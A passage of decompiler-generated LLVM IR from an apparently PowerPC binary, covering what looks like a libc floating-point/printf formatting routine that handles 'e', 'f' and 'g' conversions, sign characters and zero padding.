  %tmp75 = icmp sgt i32 %v2_10010678, -1
  br i1 %tmp75, label %dec_label_pc_10010694, label %dec_label_pc_10010690

dec_label_pc_10010690:                            ; preds = %dec_label_pc_10010688
  store i32 6, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010694

dec_label_pc_10010694:                            ; preds = %dec_label_pc_10010688, %dec_label_pc_10010690
  %v0_1001084c44 = phi i32 [ %v2_10010678, %dec_label_pc_10010688 ], [ 6, %dec_label_pc_10010690 ]
  %v1_10010694 = add i32 %tmp, 12
  %v2_10010694 = inttoptr i32 %v1_10010694 to i32*
  %v3_10010694 = load i32, i32* %v2_10010694, align 4
  store i32 %v3_10010694, i32* %r9.global-to-local, align 4
  %v1_10010698 = and i32 %v3_10010694, 2
  %v3_10010698 = icmp eq i32 %v1_10010698, 0
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %stack_var_-200, align 1
  br i1 %v3_10010698, label %dec_label_pc_100106b0, label %dec_label_pc_100106bc

dec_label_pc_100106b0:                            ; preds = %dec_label_pc_10010694
  %v1_100106b0 = urem i32 %v3_10010694, 2
  store i32 %v1_100106b0, i32* %r7.global-to-local, align 4
  %v3_100106b0 = icmp eq i32 %v1_100106b0, 0
  br i1 %v3_100106b0, label %dec_label_pc_100106c0, label %dec_label_pc_100106bc

dec_label_pc_100106bc:                            ; preds = %dec_label_pc_100106b0, %dec_label_pc_10010694
  %storemerge = phi i32 [ 43, %dec_label_pc_10010694 ], [ 32, %dec_label_pc_100106b0 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  %v6_100106bc = trunc i32 %storemerge to i8
  store i8 %v6_100106bc, i8* %stack_var_-200, align 1
  br label %dec_label_pc_100106c0

dec_label_pc_100106c0:                            ; preds = %dec_label_pc_100106b0, %dec_label_pc_100106bc
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_10010688, label %dec_label_pc_10010824, label %dec_label_pc_1001073c

dec_label_pc_1001073c:                            ; preds = %dec_label_pc_100106c0
  %v1_1001073c = icmp ult i32 %v0_1001073c, 96
  %v2_1001073c = icmp ugt i32 %v0_1001073c, 96
  %v3_1001073c = icmp eq i32 %v0_1001073c, 96
  store i1 %v1_1001073c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1001073c, i1* %cr7_eq.global-to-local, align 1
  %v2_10010744 = add i32 %tmp, 16
  %v3_10010744 = inttoptr i32 %v2_10010744 to i32*
  store i32 32, i32* %v3_10010744, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  store i32 3, i32* %stack_var_-140, align 4
  br i1 %v2_1001073c, label %dec_label_pc_10010768, label %dec_label_pc_1001075c

dec_label_pc_1001075c:                            ; preds = %dec_label_pc_1001073c
  store i32 12, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10010768

dec_label_pc_10010768:                            ; preds = %dec_label_pc_1001073c, %dec_label_pc_1001075c
  %stack_var_-136.1 = phi i32 [ add (i32 ptrtoint ([4 x i8]* @global_var_10019f08.481 to i32), i32 8), %dec_label_pc_1001073c ], [ add (i32 ptrtoint ([4 x i8]* @global_var_10019f08.481 to i32), i32 12), %dec_label_pc_1001075c ]
  store i32 ptrtoint ([4 x i8]* @global_var_10019f08.481 to i32), i32* %r9.global-to-local, align 4
  %v2_10010774 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10010774, i32* @r8, align 4
  store i32 %stack_var_-136.1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10010c14

dec_label_pc_10010824:                            ; preds = %dec_label_pc_100106c0
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_10010828 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_10010828, i32* %r6.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  store i32 1127219200, i32* %r3.global-to-local, align 4
  %v1_10010874 = xor i32 %tmp54, -2147483648
  br label %dec_label_pc_10010848

dec_label_pc_10010848:                            ; preds = %dec_label_pc_100108c8.dec_label_pc_10010848_crit_edge, %dec_label_pc_10010824
  %v0_1001084c = phi i32 [ %v0_1001084c.pre, %dec_label_pc_100108c8.dec_label_pc_10010848_crit_edge ], [ %v0_1001084c44, %dec_label_pc_10010824 ]
  %v3_1001084c = call %1 @__asm_cror(i32 %v0_1001084c, i32 %tmp, i32 %v0_1001084c)
  %v11_1001084c = extractvalue %1 %v3_1001084c, 7
  store i4 %v11_1001084c, i4* @cr4, align 1
  %v0_10010850 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_10010850, label %dec_label_pc_10010864, label %dec_label_pc_10010878

dec_label_pc_10010864:                            ; preds = %dec_label_pc_10010848
  store i32 %tmp54, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010878

dec_label_pc_10010878:                            ; preds = %dec_label_pc_10010848, %dec_label_pc_10010864
  %storemerge2 = phi i32 [ %v1_10010874, %dec_label_pc_10010864 ], [ %tmp55, %dec_label_pc_10010848 ]
  store i32 %storemerge2, i32* %r10.global-to-local, align 4
  store i32 9, i32* %r9.global-to-local, align 4
  store i32 9, i32* %ctr.global-to-local, align 4
  %v0_10010888 = load i32, i32* %r6.global-to-local, align 4
  %v1_10010888 = add i32 %v0_10010888, 9
  store i32 %v1_10010888, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 10, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_100108a4

dec_label_pc_100108a4:                            ; preds = %dec_label_pc_100108a4.dec_label_pc_100108a4_crit_edge, %dec_label_pc_10010878
  %v1_100108ac = phi i32 [ %v1_100108ac.pre, %dec_label_pc_100108a4.dec_label_pc_100108a4_crit_edge ], [ %v1_10010888, %dec_label_pc_10010878 ]
  %v0_100108a8 = phi i32 [ %v0_100108a8.pre, %dec_label_pc_100108a4.dec_label_pc_100108a4_crit_edge ], [ 0, %dec_label_pc_10010878 ]
  %v1_100108a4 = phi i32 [ %v1_100108a4.pre, %dec_label_pc_100108a4.dec_label_pc_100108a4_crit_edge ], [ 10, %dec_label_pc_10010878 ]
  %v1_100108b4 = phi i32 [ %v0_100108a4.pre, %dec_label_pc_100108a4.dec_label_pc_100108a4_crit_edge ], [ %storemerge2, %dec_label_pc_10010878 ]
  %v2_100108a4 = udiv i32 %v1_100108b4, %v1_100108a4
  store i32 %v2_100108a4, i32* %r0.global-to-local, align 4
  %v1_100108a8 = add i32 %v0_100108a8, 1
  store i32 %v1_100108a8, i32* %r8.global-to-local, align 4
  %v2_100108ac = sub i32 %v1_100108ac, %v1_100108a8
  store i32 %v2_100108ac, i32* %r11.global-to-local, align 4
  %tmp76 = mul i32 %v2_100108a4, -10
  store i32 %v2_100108a4, i32* %r10.global-to-local, align 4
  %v2_100108b4 = add i32 %v1_100108b4, 48
  %v1_100108bc = add i32 %v2_100108b4, %tmp76
  store i32 %v1_100108bc, i32* %r9.global-to-local, align 4
  %v1_100108c0 = trunc i32 %v1_100108bc to i8
  %v3_100108c0 = inttoptr i32 %v2_100108ac to i8*
  store i8 %v1_100108c0, i8* %v3_100108c0, align 1
  %v0_100108c4 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100108c4 = add i32 %v0_100108c4, -1
  store i32 %v1_100108c4, i32* %ctr.global-to-local, align 4
  %v2_100108c4 = icmp eq i32 %v1_100108c4, 0
  br i1 %v2_100108c4, label %dec_label_pc_100108c8, label %dec_label_pc_100108a4.dec_label_pc_100108a4_crit_edge

dec_label_pc_100108a4.dec_label_pc_100108a4_crit_edge: ; preds = %dec_label_pc_100108a4
  %v0_100108a4.pre = load i32, i32* %r10.global-to-local, align 4
  %v1_100108a4.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_100108a8.pre = load i32, i32* %r8.global-to-local, align 4
  %v1_100108ac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_100108a4

dec_label_pc_100108c8:                            ; preds = %dec_label_pc_100108a4
  %v0_100108c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_100108c8 = icmp slt i32 %v0_100108c8, 0
  %v3_100108c8 = icmp eq i32 %v0_100108c8, 0
  store i1 %v1_100108c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100108c8, i1* %cr7_eq.global-to-local, align 1
  %v1_100108cc = add i32 %v0_100108c8, 1
  store i32 %v1_100108cc, i32* %r7.global-to-local, align 4
  br i1 %v3_100108c8, label %dec_label_pc_100108c8.dec_label_pc_10010848_crit_edge, label %dec_label_pc_100108d4

dec_label_pc_100108c8.dec_label_pc_10010848_crit_edge: ; preds = %dec_label_pc_100108c8
  %v0_1001084c.pre = load i32, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_10010848

dec_label_pc_100108d4:                            ; preds = %dec_label_pc_100108c8
  %v0_100108d4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100108d4 = icmp ult i32 %v0_100108d4, 96
  %v2_100108d4 = icmp ugt i32 %v0_100108d4, 96
  %v3_100108d4 = icmp eq i32 %v0_100108d4, 96
  store i1 %v1_100108d4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100108d4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_100108d4, label %dec_label_pc_100108ec, label %dec_label_pc_100108dc

dec_label_pc_100108dc:                            ; preds = %dec_label_pc_100108d4
  %v1_100108e4 = add i32 %v0_100108d4, 32
  store i32 %v1_100108e4, i32* %r0.global-to-local, align 4
  %v1_100108e8 = urem i32 %v1_100108e4, 256
  store i32 %v1_100108e8, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_100108ec

dec_label_pc_100108ec:                            ; preds = %dec_label_pc_100108d4, %dec_label_pc_100108dc
  %v0_10010904 = phi i32 [ %v1_100108e8, %dec_label_pc_100108dc ], [ %v0_100108d4, %dec_label_pc_100108d4 ]
  %stack_var_-194.0 = phi i32 [ 69, %dec_label_pc_100108dc ], [ 101, %dec_label_pc_100108d4 ]
  %v1_100108ec = icmp slt i32 %v0_10010904, 103
  %v3_100108ec = icmp eq i32 %v0_10010904, 103
  store i1 %v1_100108ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100108ec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100108ec, label %dec_label_pc_100108f4, label %dec_label_pc_10010904

dec_label_pc_100108f4:                            ; preds = %dec_label_pc_100108ec
  %v0_100108f4 = load i32, i32* %r30.global-to-local, align 4
  %v1_100108f4 = icmp slt i32 %v0_100108f4, 0
  %v3_100108f4 = icmp eq i32 %v0_100108f4, 0
  store i1 %v1_100108f4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100108f4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100108f4, label %dec_label_pc_1001090c, label %dec_label_pc_100108fc

dec_label_pc_100108fc:                            ; preds = %dec_label_pc_100108f4
  %v1_100108fc = add i32 %v0_100108f4, -1
  store i32 %v1_100108fc, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_1001090c

dec_label_pc_10010904:                            ; preds = %dec_label_pc_100108ec
  %v1_10010904 = icmp slt i32 %v0_10010904, 102
  %v3_10010904 = icmp eq i32 %v0_10010904, 102
  store i1 %v1_10010904, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010904, i1* %cr7_eq.global-to-local, align 1
  %v0_10010914 = load i32, i32* %r30.global-to-local, align 4
  br i1 %v3_10010904, label %dec_label_pc_10010914, label %dec_label_pc_1001090c

dec_label_pc_1001090c:                            ; preds = %dec_label_pc_10010904, %dec_label_pc_100108f4, %dec_label_pc_100108fc
  %v0_1001090c = phi i32 [ 0, %dec_label_pc_100108f4 ], [ %v1_100108fc, %dec_label_pc_100108fc ], [ %v0_10010914, %dec_label_pc_10010904 ]
  store i32 %v0_1001090c, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010938

dec_label_pc_10010914:                            ; preds = %dec_label_pc_10010904
  %v1_10010914 = load i32, i32* %r4.global-to-local, align 4
  %v2_10010914 = add i32 %v1_10010914, %v0_10010914
  store i32 %v2_10010914, i32* %r10.global-to-local, align 4
  %v1_10010918 = icmp slt i32 %v2_10010914, -1
  %v3_10010918 = icmp eq i32 %v2_10010914, -1
  store i1 %v1_10010918, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010918, i1* %cr7_eq.global-to-local, align 1
  %tmp77 = icmp sgt i32 %v2_10010914, -2
  br i1 %tmp77, label %dec_label_pc_10010938, label %dec_label_pc_10010920

dec_label_pc_10010920:                            ; preds = %dec_label_pc_10010914
  store i32 48, i32* %r4.global-to-local, align 4
  %v2_10010924 = ptrtoint i32* %stack_var_-178 to i32
  store i32 %v2_10010924, i32* %r3.global-to-local, align 4
  store i32 17, i32* %r5.global-to-local, align 4
  store i32 268503344, i32* @lr, align 4
  %v3_1001092c = call i32 @__GI_memset(i32 %v2_10010924, i32 48, i32 17)
  store i32 %v3_1001092c, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10010938

dec_label_pc_10010938:                            ; preds = %dec_label_pc_10010914, %dec_label_pc_1001090c, %dec_label_pc_10010920
  %v1_1001095c = phi i32 [ %v2_10010914, %dec_label_pc_10010914 ], [ %v0_1001090c, %dec_label_pc_1001090c ], [ -1, %dec_label_pc_10010920 ]
  %v1_10010938 = icmp slt i32 %v1_1001095c, 16
  %v2_10010938 = icmp sgt i32 %v1_1001095c, 16
  %v3_10010938 = icmp eq i32 %v1_1001095c, 16
  store i1 %v1_10010938, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010938, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %stack_var_-178, align 4
  store i32 48, i32* %r0.global-to-local, align 4
  store i32 48, i32* %stack_var_-177, align 4
  %v2_1001094c = ptrtoint i32* %stack_var_-159 to i32
  store i32 %v2_1001094c, i32* %r11.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v2_10010938, label %dec_label_pc_10010974, label %dec_label_pc_10010958

dec_label_pc_10010958:                            ; preds = %dec_label_pc_10010938
  %v2_10010958 = ptrtoint i32* %stack_var_-177 to i32
  %v2_1001095c = add i32 %v1_1001095c, %v2_10010958
  store i32 %v2_1001095c, i32* %r9.global-to-local, align 4
  %v1_10010960 = add i32 %v2_1001095c, 2
  %v2_10010960 = inttoptr i32 %v1_10010960 to i8*
  %v3_10010960 = load i8, i8* %v2_10010960, align 1
  %v4_10010960 = zext i8 %v3_10010960 to i32
  store i32 %v4_10010960, i32* %r0.global-to-local, align 4
  store i32 %v1_10010960, i32* %r11.global-to-local, align 4
  %v1_10010968 = sub nsw i32 52, %v4_10010960
  %v2_10010968 = sub nuw nsw i32 -1, %v4_10010960
  %not.v5_10010968 = icmp ugt i32 %v1_10010968, %v2_10010968
  %v1_10010970 = zext i1 %not.v5_10010968 to i32
  store i32 %v1_10010970, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10010974

dec_label_pc_10010974:                            ; preds = %dec_label_pc_10010938, %dec_label_pc_10010958, %dec_label_pc_10010974.backedge
  %v0_10010978 = phi i32 [ %v0_10010978.pre, %dec_label_pc_10010974.backedge ], [ 0, %dec_label_pc_10010938 ], [ %v1_10010970, %dec_label_pc_10010958 ]
  %v0_10010974 = phi i32 [ %v0_10010974.pre, %dec_label_pc_10010974.backedge ], [ %v2_1001094c, %dec_label_pc_10010938 ], [ %v1_10010960, %dec_label_pc_10010958 ]
  %v1_10010974 = add i32 %v0_10010974, -1
  %v2_10010974 = inttoptr i32 %v1_10010974 to i8*
  %v3_10010974 = load i8, i8* %v2_10010974, align 1
  %v4_10010974 = zext i8 %v3_10010974 to i32
  store i32 %v1_10010974, i32* %r11.global-to-local, align 4
  %v2_10010978 = add i32 %v4_10010974, %v0_10010978
  store i32 %v2_10010978, i32* %r0.global-to-local, align 4
  %v1_1001097c = urem i32 %v2_10010978, 256
  store i32 %v1_1001097c, i32* %r9.global-to-local, align 4
  %v1_10010980 = trunc i32 %v2_10010978 to i8
  store i8 %v1_10010980, i8* %v2_10010974, align 1
  %v0_10010984 = load i32, i32* %r9.global-to-local, align 4
  %v1_10010984 = icmp slt i32 %v0_10010984, 48
  %v3_10010984 = icmp eq i32 %v0_10010984, 48
  store i1 %v1_10010984, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010984, i1* %cr7_eq.global-to-local, align 1
  %v1_10010988 = icmp ult i32 %v0_10010984, 57
  %v2_10010988 = icmp ugt i32 %v0_10010984, 57
  %v3_10010988 = icmp eq i32 %v0_10010984, 57
  store i1 %v1_10010988, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10010988, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10010988, i1* %cr6_eq.global-to-local, align 1
  %brmerge = or i1 %v3_10010984, %v2_10010988
  br i1 %brmerge, label %dec_label_pc_10010974.backedge, label %dec_label_pc_10010994

dec_label_pc_10010974.backedge:                   ; preds = %dec_label_pc_10010974
  %v0_10010974.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_10010978.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10010974

dec_label_pc_10010994:                            ; preds = %dec_label_pc_10010974
  %v2_10010994 = ptrtoint i32* %stack_var_-177 to i32
  store i32 %v2_10010994, i32* %r0.global-to-local, align 4
  %v0_10010998 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10010998, i32* %r7.global-to-local, align 4
  %v0_1001099c = load i32, i32* %r11.global-to-local, align 4
  %v2_1001099c = icmp ult i32 %v0_1001099c, %v2_10010994
  %v3_1001099c = icmp ugt i32 %v0_1001099c, %v2_10010994
  %v4_1001099c = icmp eq i32 %v0_1001099c, %v2_10010994
  store i1 %v2_1001099c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1001099c, i1* %cr7_eq.global-to-local, align 1
  store i32 %v2_10010828, i32* %r8.global-to-local, align 4
  br i1 %v3_1001099c, label %dec_label_pc_100109b4, label %dec_label_pc_100109a8

dec_label_pc_100109a8:                            ; preds = %dec_label_pc_10010994
  store i32 %v2_10010994, i32* %r8.global-to-local, align 4
  %v1_100109ac = add i32 %v0_10010998, 1
  store i32 %v1_100109ac, i32* %r7.global-to-local, align 4
  store i32 %v2_10010994, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_100109b4

dec_label_pc_100109b4:                            ; preds = %dec_label_pc_10010994, %dec_label_pc_100109a8
  %v2_100109bc = phi i32 [ %v0_1001099c, %dec_label_pc_10010994 ], [ %v2_10010994, %dec_label_pc_100109a8 ]
  %v0_100109b4 = load i32, i32* %r31.global-to-local, align 4
  %v1_100109b4 = icmp slt i32 %v0_100109b4, 103
  %v3_100109b4 = icmp eq i32 %v0_100109b4, 103
  store i1 %v1_100109b4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100109b4, i1* %cr7_eq.global-to-local, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_100109bc = add i32 %v2_100109bc, 1
  %v4_100109bc = inttoptr i32 %v3_100109bc to i8*
  store i8 0, i8* %v4_100109bc, align 1
  %v0_100109c0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100109c0 = add i32 %v0_100109c0, 1
  store i32 %v1_100109c0, i32* %r9.global-to-local, align 4
  %v0_100109c4 = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100109c4, label %dec_label_pc_100109c8, label %dec_label_pc_100109ec

dec_label_pc_100109c8:                            ; preds = %dec_label_pc_100109b4
  %v0_100109c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_100109c8 = icmp slt i32 %v0_100109c8, -4
  %v3_100109c8 = icmp eq i32 %v0_100109c8, -4
  store i1 %v1_100109c8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100109c8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v1_100109c8, label %dec_label_pc_100109e4, label %dec_label_pc_100109d0

dec_label_pc_100109d0:                            ; preds = %dec_label_pc_100109c8
  %v1_100109d0 = load i32, i32* %r10.global-to-local, align 4
  %v2_100109d0 = icmp sgt i32 %v1_100109d0, %v0_100109c8
  %v3_100109d0 = icmp slt i32 %v1_100109d0, %v0_100109c8
  %v4_100109d0 = icmp eq i32 %v1_100109d0, %v0_100109c8
  store i1 %v2_100109d0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_100109d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100109d0, label %dec_label_pc_100109e4, label %dec_label_pc_100109d8

dec_label_pc_100109d8:                            ; preds = %dec_label_pc_100109d0
  %v2_100109d8 = sub i32 %v1_100109d0, %v0_100109c8
  store i32 %v2_100109d8, i32* %r30.global-to-local, align 4
  store i32 102, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_10010a04

dec_label_pc_100109e4:                            ; preds = %dec_label_pc_100109d0, %dec_label_pc_100109c8
  store i32 103, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_100109f8

dec_label_pc_100109ec:                            ; preds = %dec_label_pc_100109b4
  %v0_100109ec = load i32, i32* %r31.global-to-local, align 4
  %v1_100109ec = icmp slt i32 %v0_100109ec, 102
  %v3_100109ec = icmp eq i32 %v0_100109ec, 102
  store i1 %v1_100109ec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_100109ec, i1* %cr7_eq.global-to-local, align 1
  store i32 %v0_100109ec, i32* %r4.global-to-local, align 4
  br i1 %v3_100109ec, label %dec_label_pc_10010a04thread-pre-split, label %dec_label_pc_100109f8

dec_label_pc_100109f8:                            ; preds = %dec_label_pc_100109ec, %dec_label_pc_100109e4
  store i32 0, i32* %r10.global-to-local, align 4
  store i1 false, i1* %cr6_lt.global-to-local, align 1
  store i1 false, i1* %cr6_gt.global-to-local, align 1
  store i1 true, i1* %cr6_eq.global-to-local, align 1
  br label %dec_label_pc_10010a18

dec_label_pc_10010a04thread-pre-split:            ; preds = %dec_label_pc_100109ec
  %v0_10010a04.pr = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_10010a04

dec_label_pc_10010a04:                            ; preds = %dec_label_pc_10010a04thread-pre-split, %dec_label_pc_100109d8
  %v0_10010a08 = phi i32 [ %v0_10010a04.pr, %dec_label_pc_10010a04thread-pre-split ], [ %v0_100109c8, %dec_label_pc_100109d8 ]
  %v1_10010a04 = icmp slt i32 %v0_10010a08, 0
  %v2_10010a04 = icmp sgt i32 %v0_10010a08, 0
  %v3_10010a04 = icmp eq i32 %v0_10010a08, 0
  store i1 %v1_10010a04, i1* %cr6_lt.global-to-local, align 1
  store i1 %v2_10010a04, i1* %cr6_gt.global-to-local, align 1
  store i1 %v3_10010a04, i1* %cr6_eq.global-to-local, align 1
  store i32 %v0_10010a08, i32* %r10.global-to-local, align 4
  %tmp78 = icmp sgt i32 %v0_10010a08, -1
  br i1 %tmp78, label %dec_label_pc_10010a18, label %dec_label_pc_10010a10

dec_label_pc_10010a10:                            ; preds = %dec_label_pc_10010a04
  store i32 48, i32* %r0.global-to-local, align 4
  %v2_10010a14 = load i32, i32* %r8.global-to-local, align 4
  %v3_10010a14 = add i32 %v2_10010a14, -1
  %v4_10010a14 = inttoptr i32 %v3_10010a14 to i8*
  store i8 48, i8* %v4_10010a14, align 1
  store i32 %v3_10010a14, i32* %r8.global-to-local, align 4
  %v1_10010a34.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10010a48.pre = load i1, i1* %cr6_lt.global-to-local, align 1
  br label %dec_label_pc_10010a18

dec_label_pc_10010a18:                            ; preds = %dec_label_pc_10010a04, %dec_label_pc_100109f8, %dec_label_pc_10010a10
  %v0_10010a48 = phi i1 [ %v1_10010a04, %dec_label_pc_10010a04 ], [ false, %dec_label_pc_100109f8 ], [ %v0_10010a48.pre, %dec_label_pc_10010a10 ]
  %v1_10010a34 = phi i32 [ %v1_100109c0, %dec_label_pc_10010a04 ], [ %v1_100109c0, %dec_label_pc_100109f8 ], [ %v1_10010a34.pre, %dec_label_pc_10010a10 ]
  store i32 176, i32* %r5.global-to-local, align 4
  store i32 1, i32* %stack_var_-140, align 4
  %v2_10010a24 = ptrtoint i32* %stack_var_-196 to i32
  store i32 %v2_10010a24, i32* %r0.global-to-local, align 4
  %v0_10010a2c = load i32, i32* %r8.global-to-local, align 4
  %v1_10010a2c = add i32 %v0_10010a2c, 1
  store i32 %v1_10010a2c, i32* %r6.global-to-local, align 4
  %v2_10010a34 = sub i32 %v1_10010a34, %v1_10010a2c
  store i32 %v2_10010a34, i32* %r11.global-to-local, align 4
  %v1_10010a38 = inttoptr i32 %v0_10010a2c to i8*
  %v2_10010a38 = load i8, i8* %v1_10010a38, align 1
  %v3_10010a38 = zext i8 %v2_10010a38 to i32
  store i32 %v3_10010a38, i32* %stack_var_-196, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v0_10010a48, label %dec_label_pc_10010aa8, label %dec_label_pc_10010a4c

dec_label_pc_10010a4c:                            ; preds = %dec_label_pc_10010a18
  %v0_10010a4c = load i32, i32* %r10.global-to-local, align 4
  %v2_10010a4c = icmp slt i32 %v0_10010a4c, %v2_10010a34
  %v4_10010a4c = icmp eq i32 %v0_10010a4c, %v2_10010a34
  store i1 %v2_10010a4c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10010a4c, i1* %cr7_eq.global-to-local, align 1
  store i32 112, i32* %r0.global-to-local, align 4
  store i32 112, i32* %stack_var_-132, align 4
  br i1 %v2_10010a4c, label %dec_label_pc_10010aa0, label %dec_label_pc_10010a60

dec_label_pc_10010a60:                            ; preds = %dec_label_pc_10010a4c
  %v2_10010a60 = sub i32 %v0_10010a4c, %v2_10010a34
  store i32 %v2_10010a60, i32* %r0.global-to-local, align 4
  %v4_10010a60 = icmp sgt i32 %v2_10010a60, 0
  store i32 -1, i32* %r10.global-to-local, align 4
  br i1 %v4_10010a60, label %dec_label_pc_10010a7c, label %dec_label_pc_10010a6c

dec_label_pc_10010a6c:                            ; preds = %dec_label_pc_10010a60
  %v2_10010a70 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10010a70, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10010ac4

dec_label_pc_10010a7c:                            ; preds = %dec_label_pc_10010a60
  store i32 ptrtoint (i32* @global_var_10019f0b.483 to i32), i32* %r9.global-to-local, align 4
  %v2_10010a88 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %v2_10010a88, i32* @r8, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  store i32 176, i32* %stack_var_-120, align 4
  br label %dec_label_pc_10010ac4

dec_label_pc_10010aa0:                            ; preds = %dec_label_pc_10010a4c
  %v0_10010aa0 = load i1, i1* %cr6_gt.global-to-local, align 1
  br i1 %v0_10010aa0, label %dec_label_pc_10010ab0, label %dec_label_pc_10010aa4

dec_label_pc_10010aa4:                            ; preds = %dec_label_pc_10010aa0
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010aa8

dec_label_pc_10010aa8:                            ; preds = %dec_label_pc_10010a18, %dec_label_pc_10010aa4
  %v2_10010aa8 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_10010aa8, i32* @r8, align 4
  br label %dec_label_pc_10010ac4

dec_label_pc_10010ab0:                            ; preds = %dec_label_pc_10010aa0
  %v2_10010ab0 = sub i32 %v2_10010a34, %v0_10010a4c
  store i32 %v2_10010ab0, i32* %r11.global-to-local, align 4
  %v2_10010ab8 = add i32 %v0_10010a4c, %v1_10010a2c
  store i32 %v2_10010ab8, i32* %r6.global-to-local, align 4
  %v2_10010abc = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_10010abc, i32* @r8, align 4
  store i32 -1, i32* %r10.global-to-local, align 4
  br label %dec_label_pc_10010ac4

dec_label_pc_10010ac4:                            ; preds = %dec_label_pc_10010aa8, %dec_label_pc_10010a7c, %dec_label_pc_10010a6c, %dec_label_pc_10010ab0
  %v1_10010af0 = phi i32 [ %v2_10010aa8, %dec_label_pc_10010aa8 ], [ %v2_10010a88, %dec_label_pc_10010a7c ], [ %v2_10010a70, %dec_label_pc_10010a6c ], [ %v2_10010abc, %dec_label_pc_10010ab0 ]
  %v0_10010ad0 = phi i32 [ %v2_10010a34, %dec_label_pc_10010aa8 ], [ 0, %dec_label_pc_10010a7c ], [ 0, %dec_label_pc_10010a6c ], [ %v2_10010ab0, %dec_label_pc_10010ab0 ]
  %v3_10010ac4 = load i32, i32* %v2_10010694, align 4
  store i32 %v3_10010ac4, i32* %r0.global-to-local, align 4
  %v1_10010ac8 = and i32 %v3_10010ac4, 16
  store i32 %v1_10010ac8, i32* %r9.global-to-local, align 4
  %v3_10010ac8 = icmp eq i32 %v1_10010ac8, 0
  br i1 %v3_10010ac8, label %dec_label_pc_10010ad0, label %dec_label_pc_10010ae8

dec_label_pc_10010ad0:                            ; preds = %dec_label_pc_10010ac4
  %v1_10010ad0 = icmp slt i32 %v0_10010ad0, 0
  %v3_10010ad0 = icmp eq i32 %v0_10010ad0, 0
  store i1 %v1_10010ad0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010ad0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10010ad0, label %dec_label_pc_10010ad8, label %dec_label_pc_10010ae8

dec_label_pc_10010ad8:                            ; preds = %dec_label_pc_10010ad0
  %v0_10010ad8 = load i32, i32* %r31.global-to-local, align 4
  %v1_10010ad8 = icmp slt i32 %v0_10010ad8, 103
  %v3_10010ad8 = icmp eq i32 %v0_10010ad8, 103
  store i1 %v1_10010ad8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10010ad8, i1* %cr7_eq.global-to-local, align 1
